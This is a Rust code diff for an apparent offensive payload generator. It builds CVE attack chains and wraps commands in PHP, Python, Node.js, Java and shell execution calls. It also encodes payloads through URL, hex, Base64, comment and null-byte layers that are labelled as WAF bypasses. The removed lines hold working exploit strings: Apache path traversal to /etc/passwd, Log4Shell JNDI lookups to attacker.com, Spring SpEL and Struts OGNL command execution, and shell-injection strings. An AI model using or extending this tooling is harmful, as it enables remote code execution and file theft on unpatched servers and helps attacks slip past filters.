@@ -6,21 +6,58 @@ use serde::{Deserialize, Serialize};
 /// Supported target languages/frameworks for payload generation.
 #[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
 pub enum TargetLang {
-    PHP, Python, NodeJs, Java, Ruby, Go, Rust, CSharp, Perl, Lua, Bash,
-    JSP, ASP, ASPNet, Django, Flask, SpringBoot, Laravel, WordPress, Drupal, Generic,
+    PHP,
+    Python,
+    NodeJs,
+    Java,
+    Ruby,
+    Go,
+    Rust,
+    CSharp,
+    Perl,
+    Lua,
+    Bash,
+    JSP,
+    ASP,
+    ASPNet,
+    Django,
+    Flask,
+    SpringBoot,
+    Laravel,
+    WordPress,
+    Drupal,
+    Generic,
 }
 
 /// Supported encoding/obfuscation layers.
 #[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
 pub enum EncodingLayer {
-    None, UrlEncode, UrlDoubleEncode, HtmlEntity, HtmlDecimal, HexEncode, UnicodeEscape,
-    Base64, MixedCase, InlineComment, NullByteTruncation, WhitespacePadding,
+    None,
+    UrlEncode,
+    UrlDoubleEncode,
+    HtmlEntity,
+    HtmlDecimal,
+    HexEncode,
+    UnicodeEscape,
+    Base64,
+    MixedCase,
+    InlineComment,
+    NullByteTruncation,
+    WhitespacePadding,
 }
 
 /// Database engine for SQLi payload adaptation.
 #[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
 pub enum Dbms {
-    MySQL, MSSQL, PostgreSQL, Oracle, SQLite, Redis, MongoDB, Cassandra, Generic,
+    MySQL,
+    MSSQL,
+    PostgreSQL,
+    Oracle,
+    SQLite,
+    Redis,
+    MongoDB,
+    Cassandra,
+    Generic,
 }
 
 /// Generated payload with metadata.
@@ -49,134 +86,147 @@ pub struct CvePayloadTemplate {
     pub tags: Vec<String>,
 }
 
-/// Returns CVE payload templates as a `Vec` (avoids const allocation restrictions).
+/// Infer likely target languages for a CVE entry from its component and attack type.
+fn infer_target_langs(component: &str, attack: &str) -> Vec<TargetLang> {
+    let lower = component.to_lowercase();
+    let attack = attack.to_lowercase();
+    if lower.contains("spring")
+        || lower.contains("struts")
+        || lower.contains("java")
+        || lower.contains("ofbiz")
+        || lower.contains("weblogic")
+        || lower.contains("solr")
+        || lower.contains("tomcat")
+        || lower.contains("activemq")
+        || lower.contains("rocketmq")
+        || lower.contains("geoserver")
+        || lower.contains("hugegraph")
+        || lower.contains("nifi")
+        || lower.contains("openmetadata")
+    {
+        return vec![TargetLang::Java, TargetLang::SpringBoot];
+    }
+    if lower.contains("php")
+        || lower.contains("wordpress")
+        || lower.contains("drupal")
+        || lower.contains("joomla")
+        || lower.contains("magento")
+        || lower.contains("laravel")
+        || lower.contains("symfony")
+        || lower.contains("woocommerce")
+        || lower.contains("duplicator")
+        || lower.contains("wpforms")
+        || lower.contains("forminator")
+        || lower.contains("wp-rocket")
+        || lower.contains("litespeed")
+    {
+        return vec![TargetLang::PHP];
+    }
+    if lower.contains("python")
+        || lower.contains("django")
+        || lower.contains("flask")
+        || lower.contains("fastapi")
+        || lower.contains("aiohttp")
+        || lower.contains("airflow")
+        || lower.contains("pgadmin")
+        || lower.contains("jupyter")
+        || lower.contains("salt")
+    {
+        return vec![TargetLang::Python];
+    }
+    if lower.contains("node")
+        || lower.contains("next.js")
+        || lower.contains("react")
+        || lower.contains("angular")
+        || lower.contains("vue")
+        || lower.contains("express")
+        || lower.contains("vm2")
+        || lower.contains("javascript")
+    {
+        return vec![TargetLang::NodeJs];
+    }
+    if lower.contains("ruby") || lower.contains("rails") {
+        return vec![TargetLang::Ruby];
+    }
+    if lower.contains("go") || lower.contains("golang") {
+        return vec![TargetLang::Go];
+    }
+    if lower.contains("rust") {
+        return vec![TargetLang::Rust];
+    }
+    if lower.contains("c#")
+        || lower.contains(".net")
+        || lower.contains("aspnet")
+        || lower.contains("aspx")
+    {
+        return vec![TargetLang::CSharp];
+    }
+    if lower.contains("perl") {
+        return vec![TargetLang::Perl];
+    }
+    if lower.contains("lua") || lower.contains("redis") {
+        return vec![TargetLang::Lua];
+    }
+    if lower.contains("bash")
+        || lower.contains("shell")
+        || lower.contains("sudo")
+        || lower.contains("linux")
+        || lower.contains("git")
+        || lower.contains("docker")
+        || lower.contains("runc")
+        || lower.contains("openssh")
+    {
+        return vec![TargetLang::Bash];
+    }
+    if attack.contains("ssti")
+        || attack.contains("template")
+        || attack.contains("jinja")
+        || attack.contains("velocity")
+        || attack.contains("freemarker")
+    {
+        return vec![TargetLang::Generic];
+    }
+    vec![TargetLang::Generic]
+}
+
+/// Convert an attack-type label into a stable technique slug.
+fn normalize_technique(attack: &str) -> String {
+    attack.to_lowercase().replace(' ', "_").replace('-', "_")
+}
+
+/// Returns CVE payload templates derived from the full CVE database.
 pub fn get_all_cve_templates() -> Vec<CvePayloadTemplate> {
-    vec![
-        CvePayloadTemplate {
-            cve_id: "CVE-2021-41773".into(),
-            name: "Apache 2.4.49 Path Traversal".into(),
-            affected_component: "Apache HTTP Server".into(),
-            technique: "path_traversal".into(),
-            description: "Apache 2.4.49 path traversal allowing file read via encoded path segments".into(),
-            payload_stages: vec![
-                vec!["/cgi-bin/.%2e/.%2e/.%2e/etc/passwd".into(), "/icons/.%2e/%2f/etc/passwd".into()],
-                vec!["..%2f..%2f..%2fetc/passwd".into(), "....//....//....//etc/passwd".into()],
-            ],
-            target_langs: vec![TargetLang::Generic],
-            severity: "Critical".into(),
-            cvss_score: Some(7.5),
-            tags: vec!["path-traversal".into(), "apache".into(), "cve-2021-41773".into()],
-        },
-        CvePayloadTemplate {
-            cve_id: "CVE-2021-42013".into(),
-            name: "Apache 2.4.50 Path Traversal".into(),
-            affected_component: "Apache HTTP Server".into(),
-            technique: "path_traversal".into(),
-            description: "Apache 2.4.50 path traversal bypass of CVE-2021-41773 patch".into(),
-            payload_stages: vec![
-                vec!["/cgi-bin/..%2f..%2f..%2fetc/passwd".into()],
-                vec!["/icons/..%2f..%2f..%2fetc/passwd".into()],
-            ],
-            target_langs: vec![TargetLang::Generic],
-            severity: "Critical".into(),
-            cvss_score: Some(9.8),
-            tags: vec!["path-traversal".into(), "apache".into(), "cve-2021-42013".into()],
-        },
-        CvePayloadTemplate {
-            cve_id: "CVE-2022-22965".into(),
-            name: "Spring4Shell".into(),
-            affected_component: "Spring Framework".into(),
-            technique: "ssti".into(),
-            description: "Spring4Shell - SpEL injection in Spring v4.3.18+".into(),
-            payload_stages: vec![
-                vec!["class.classLoader.resources.context.parent.privateMap.entry[\\'tomcat.cat\\'].name".into()],
-                vec!["T(java.lang.Runtime).getRuntime().exec('id')".into()],
-            ],
-            target_langs: vec![TargetLang::Java, TargetLang::SpringBoot],
-            severity: "Critical".into(),
-            cvss_score: Some(9.8),
-            tags: vec!["rce".into(), "spring".into(), "spel".into(), "cve-2022-22965".into()],
-        },
-        CvePayloadTemplate {
-            cve_id: "CVE-2021-44228".into(),
-            name: "Log4Shell".into(),
-            affected_component: "Apache Log4j".into(),
-            technique: "command_injection".into(),
-            description: "JNDI lookup injection via ${jndi:ldap://} in log4j interpolation".into(),
-            payload_stages: vec![
-                vec!["${jndi:ldap://attacker.com/a}".into(), "${jndi:rmi://attacker.com/a}".into()],
-                vec!["${${lower:j}ndi:${lower:l}dap://attacker.com/${lower:a}}".into()],
-                vec!["${jndi:ldap://attacker.com/${upper:a}}${lower:${upper:j}ndi}".into()],
-            ],
-            target_langs: vec![TargetLang::Java, TargetLang::Generic],
-            severity: "Critical".into(),
-            cvss_score: Some(10.0),
-            tags: vec!["rce".into(), "jndi".into(), "ldap".into(), "java".into(), "cve-2021-44228".into()],
-        },
-        CvePayloadTemplate {
-            cve_id: "CVE-2022-22963".into(),
-            name: "Spring Cloud Function SpEL".into(),
-            affected_component: "Spring Cloud Function".into(),
-            technique: "ssti".into(),
-            description: "Spring Cloud Function SpEL injection via class path wildcard headers".into(),
-            payload_stages: vec![
-                vec!["T(java.lang.Runtime).getRuntime().exec('id')".into()],
-                vec!["new java.lang.ProcessBuilder(new java.lang.String[]{{'id'}}).start()".into()],
-            ],
-            target_langs: vec![TargetLang::Java, TargetLang::SpringBoot],
-            severity: "Critical".into(),
-            cvss_score: Some(9.8),
-            tags: vec!["rce".into(), "spring".into(), "spel".into(), "cve-2022-22963".into()],
-        },
-        CvePayloadTemplate {
-            cve_id: "CVE-2017-12611".into(),
-            name: "Apache Struts OGNL".into(),
-            affected_component: "Apache Struts".into(),
-            technique: "ssti".into(),
-            description: "OGNL expression injection in Struts2 dev mode".into(),
-            payload_stages: vec![
-                vec!["%{{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):(#context.setMemberAccess(#dm))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:{{'/bin/bash','-c',#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).#p.redirectErrorStream(true).#process=#p.start().(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).#ros.flush()}}".into()],
-            ],
-            target_langs: vec![TargetLang::Java],
-            severity: "Critical".into(),
-            cvss_score: Some(10.0),
-            tags: vec!["rce".into(), "struts".into(), "ognl".into(), "cve-2017-12611".into()],
-        },
-        CvePayloadTemplate {
-            cve_id: "CVE-2021-3156".into(),
-            name: "Baron Samedit".into(),
-            affected_component: "sudo".into(),
-            technique: "command_injection".into(),
-            description: "Baron Samedit - sudo heap overflow allowing privilege escalation".into(),
-            payload_stages: vec![
-                vec!["sudoedit -S /etc/sudoers".into(), "-s /etc/sudoers".into()],
-            ],
-            target_langs: vec![TargetLang::Generic],
-            severity: "Critical".into(),
-            cvss_score: Some(7.8),
-            tags: vec!["privilege-escalation".into(), "sudo".into(), "cve-2021-3156".into()],
-        },
-        CvePayloadTemplate {
-            cve_id: "CVE-2023-3400".into(),
-            name: "Palo Alto GlobalProtect".into(),
-            affected_component: "Palo Alto GlobalProtect".into(),
-            technique: "command_injection".into(),
-            description: "Command injection in GlobalProtect management interface".into(),
-            payload_stages: vec![
-                vec!["; cat /etc/passwd".into(), "| cat /etc/passwd".into()],
-                vec!["$(cat /etc/passwd)".into(), "`cat /etc/passwd`".into()],
-            ],
-            target_langs: vec![TargetLang::Generic],
-            severity: "Critical".into(),
-            cvss_score: Some(10.0),
-            tags: vec!["rce".into(), "globalprotect".into(), "cve-2023-3400".into()],
-        },
-    ]
+    crate::cve_db::get_cve_database()
+        .into_iter()
+        .map(|entry| {
+            let target_langs = infer_target_langs(&entry.affected_component, &entry.attack_type);
+            let technique = normalize_technique(&entry.attack_type);
+            let stages = if entry.payload_examples.is_empty() {
+                vec![vec!["PAYLOAD".into()]]
+            } else {
+                vec![entry.payload_examples]
+            };
+            CvePayloadTemplate {
+                cve_id: entry.cve_id,
+                name: entry.name,
+                affected_component: entry.affected_component,
+                technique,
+                description: entry.description,
+                payload_stages: stages,
+                target_langs,
+                severity: entry.severity,
+                cvss_score: Some(entry.cvss_score),
+                tags: entry.tags,
+            }
+        })
+        .collect()
 }
 
 /// Looks up CVE payload templates by CVE ID.
 pub fn get_cve_templates(cve_id: &str) -> Option<CvePayloadTemplate> {
-    get_all_cve_templates().into_iter().find(|t| t.cve_id == cve_id)
+    get_all_cve_templates()
+        .into_iter()
+        .find(|t| t.cve_id == cve_id)
 }
 
 /// Encodes a raw payload string according to a specified encoding layer.
@@ -188,41 +238,49 @@ pub fn apply_encoding(raw: &str, layer: &EncodingLayer) -> String {
             let first = urlencoding::encode(raw);
             urlencoding::encode(&first).to_string()
         }
-        EncodingLayer::HtmlEntity => {
-            raw.chars().map(|c| format!("&#{};", c as u32)).collect()
-        }
-        EncodingLayer::HtmlDecimal => {
-            raw.chars().map(|c| format!("&#x{:x};", c as u32)).collect()
-        }
-        EncodingLayer::HexEncode => {
-            raw.chars()
-                .map(|c| format!("%{:02x}", c as u8))
-                .collect()
-        }
-        EncodingLayer::UnicodeEscape => {
-            raw.chars()
-                .map(|c| if (c as u32) > 127 { format!("\\u{:04x}", c as u32) } else { c.to_string() })
-                .collect()
-        }
-        EncodingLayer::Base64 => {
-            base64::engine::general_purpose::STANDARD.encode(raw.as_bytes())
-        }
-        EncodingLayer::MixedCase => {
-            raw.chars()
-                .enumerate()
-                .map(|(i, c)| if i % 2 == 0 { c.to_uppercase().collect::<String>() } else { c.to_lowercase().collect::<String>() })
-                .collect()
-        }
-        EncodingLayer::InlineComment => {
-            raw.chars()
-                .map(|c| if c.is_alphanumeric() { c.to_string() } else { format!("{}/**/", c) })
-                .collect()
-        }
+        EncodingLayer::HtmlEntity => raw.chars().map(|c| format!("&#{};", c as u32)).collect(),
+        EncodingLayer::HtmlDecimal => raw.chars().map(|c| format!("&#x{:x};", c as u32)).collect(),
+        EncodingLayer::HexEncode => raw.chars().map(|c| format!("%{:02x}", c as u8)).collect(),
+        EncodingLayer::UnicodeEscape => raw
+            .chars()
+            .map(|c| {
+                if (c as u32) > 127 {
+                    format!("\\u{:04x}", c as u32)
+                } else {
+                    c.to_string()
+                }
+            })
+            .collect(),
+        EncodingLayer::Base64 => base64::engine::general_purpose::STANDARD.encode(raw.as_bytes()),
+        EncodingLayer::MixedCase => raw
+            .chars()
+            .enumerate()
+            .map(|(i, c)| {
+                if i % 2 == 0 {
+                    c.to_uppercase().collect::<String>()
+                } else {
+                    c.to_lowercase().collect::<String>()
+                }
+            })
+            .collect(),
+        EncodingLayer::InlineComment => raw
+            .chars()
+            .map(|c| {
+                if c.is_alphanumeric() {
+                    c.to_string()
+                } else {
+                    format!("{}/**/", c)
+                }
+            })
+            .collect(),
         EncodingLayer::NullByteTruncation => format!("{}\0", raw),
         EncodingLayer::WhitespacePadding => {
             let pads = [" ", "\t", "\r", "\n", "  ", "\t\t"];
             raw.chars()
-                .map(|c| { let pad = pads[(c as usize) % pads.len()]; format!("{}{}", pad, c) })
+                .map(|c| {
+                    let pad = pads[(c as usize) % pads.len()];
+                    format!("{}{}", pad, c)
+                })
                 .collect()
         }
     }
@@ -231,48 +289,83 @@ pub fn apply_encoding(raw: &str, layer: &EncodingLayer) -> String {
 /// Generates all encoding variants of a raw payload.
 pub fn generate_all_encodings(raw: &str) -> Vec<GeneratedPayload> {
     let layers = vec![
-        EncodingLayer::None, EncodingLayer::UrlEncode, EncodingLayer::UrlDoubleEncode,
-        EncodingLayer::HtmlEntity, EncodingLayer::HtmlDecimal, EncodingLayer::HexEncode,
-        EncodingLayer::UnicodeEscape, EncodingLayer::Base64, EncodingLayer::MixedCase,
-        EncodingLayer::InlineComment, EncodingLayer::NullByteTruncation, EncodingLayer::WhitespacePadding,
+        EncodingLayer::None,
+        EncodingLayer::UrlEncode,
+        EncodingLayer::UrlDoubleEncode,
+        EncodingLayer::HtmlEntity,
+        EncodingLayer::HtmlDecimal,
+        EncodingLayer::HexEncode,
+        EncodingLayer::UnicodeEscape,
+        EncodingLayer::Base64,
+        EncodingLayer::MixedCase,
+        EncodingLayer::InlineComment,
+        EncodingLayer::NullByteTruncation,
+        EncodingLayer::WhitespacePadding,
     ];
 
-    layers.into_iter().map(|layer| GeneratedPayload {
-        raw: apply_encoding(raw, &layer),
-        encoding_layers: vec![layer],
-        dbms: Dbms::Generic,
-        technique: "encoding".into(),
-        waf_bypass: true,
-        stage: 1,
-    }).collect()
+    layers
+        .into_iter()
+        .map(|layer| GeneratedPayload {
+            raw: apply_encoding(raw, &layer),
+            encoding_layers: vec![layer],
+            dbms: Dbms::Generic,
+            technique: "encoding".into(),
+            waf_bypass: true,
+            stage: 1,
+        })
+        .collect()
 }
 
 /// Generates cross-language variants of a payload concept.
 pub fn generate_cross_language_payloads(concept: &str) -> Vec<GeneratedPayload> {
     let mut results = Vec::new();
     results.push(GeneratedPayload {
-        raw: format!("<?php {} ?>", concept), encoding_layers: vec![EncodingLayer::None],
-        dbms: Dbms::Generic, technique: "cross-language".into(), waf_bypass: false, stage: 1,
+        raw: format!("<?php {} ?>", concept),
+        encoding_layers: vec![EncodingLayer::None],
+        dbms: Dbms::Generic,
+        technique: "cross-language".into(),
+        waf_bypass: false,
+        stage: 1,
     });
     results.push(GeneratedPayload {
-        raw: format!("__import__('os').system('{}')", concept), encoding_layers: vec![EncodingLayer::None],
-        dbms: Dbms::Generic, technique: "cross-language".into(), waf_bypass: true, stage: 1,
+        raw: format!("__import__('os').system('{}')", concept),
+        encoding_layers: vec![EncodingLayer::None],
+        dbms: Dbms::Generic,
+        technique: "cross-language".into(),
+        waf_bypass: true,
+        stage: 1,
     });
     results.push(GeneratedPayload {
-        raw: format!("require('child_process').execSync('{}')", concept), encoding_layers: vec![EncodingLayer::None],
-        dbms: Dbms::Generic, technique: "cross-language".into(), waf_bypass: true, stage: 1,
+        raw: format!("require('child_process').execSync('{}')", concept),
+        encoding_layers: vec![EncodingLayer::None],
+        dbms: Dbms::Generic,
+        technique: "cross-language".into(),
+        waf_bypass: true,
+        stage: 1,
     });
     results.push(GeneratedPayload {
-        raw: format!("Runtime.getRuntime().exec(\"{}\")", concept), encoding_layers: vec![EncodingLayer::None],
-        dbms: Dbms::Generic, technique: "cross-language".into(), waf_bypass: true, stage: 1,
+        raw: format!("Runtime.getRuntime().exec(\"{}\")", concept),
+        encoding_layers: vec![EncodingLayer::None],
+        dbms: Dbms::Generic,
+        technique: "cross-language".into(),
+        waf_bypass: true,
+        stage: 1,
     });
     results.push(GeneratedPayload {
-        raw: format!("system(\"{}\")", concept), encoding_layers: vec![EncodingLayer::None],
-        dbms: Dbms::Generic, technique: "cross-language".into(), waf_bypass: true, stage: 1,
+        raw: format!("system(\"{}\")", concept),
+        encoding_layers: vec![EncodingLayer::None],
+        dbms: Dbms::Generic,
+        technique: "cross-language".into(),
+        waf_bypass: true,
+        stage: 1,
     });
     results.push(GeneratedPayload {
-        raw: format!("`{}`", concept), encoding_layers: vec![EncodingLayer::None],
-        dbms: Dbms::Generic, technique: "cross-language".into(), waf_bypass: false, stage: 1,
+        raw: format!("`{}`", concept),
+        encoding_layers: vec![EncodingLayer::None],
+        dbms: Dbms::Generic,
+        technique: "cross-language".into(),
+        waf_bypass: false,
+        stage: 1,
     });
     results
 }
@@ -282,9 +375,14 @@ pub fn generate_waf_bypass_variants(payload: &str) -> Vec<GeneratedPayload> {
     let mut variants = Vec::new();
 
     for layer in &[
-        EncodingLayer::InlineComment, EncodingLayer::MixedCase, EncodingLayer::NullByteTruncation,
-        EncodingLayer::WhitespacePadding, EncodingLayer::UrlEncode, EncodingLayer::UrlDoubleEncode,
-        EncodingLayer::HtmlEntity, EncodingLayer::HexEncode,
+        EncodingLayer::InlineComment,
+        EncodingLayer::MixedCase,
+        EncodingLayer::NullByteTruncation,
+        EncodingLayer::WhitespacePadding,
+        EncodingLayer::UrlEncode,
+        EncodingLayer::UrlDoubleEncode,
+        EncodingLayer::HtmlEntity,
+        EncodingLayer::HexEncode,
     ] {
         variants.push(GeneratedPayload {
             raw: apply_encoding(payload, layer),
@@ -306,8 +404,14 @@ pub fn generate_cve_attack_chain(template: &CvePayloadTemplate) -> Vec<Generated
         for payload in stage_payloads {
             let mut encodings = generate_all_encodings(payload);
             let mut waf_bypass = generate_waf_bypass_variants(payload);
-            for p in encodings.iter_mut() { p.stage = stage_idx + 1; p.technique = template.technique.clone(); }
-            for p in waf_bypass.iter_mut() { p.stage = stage_idx + 1; p.technique = format!("{}-waf-bypass", template.technique); }
+            for p in encodings.iter_mut() {
+                p.stage = stage_idx + 1;
+                p.technique = template.technique.clone();
+            }
+            for p in waf_bypass.iter_mut() {
+                p.stage = stage_idx + 1;
+                p.technique = format!("{}-waf-bypass", template.technique);
+            }
             chain.extend(encodings);
             chain.extend(waf_bypass);
         }
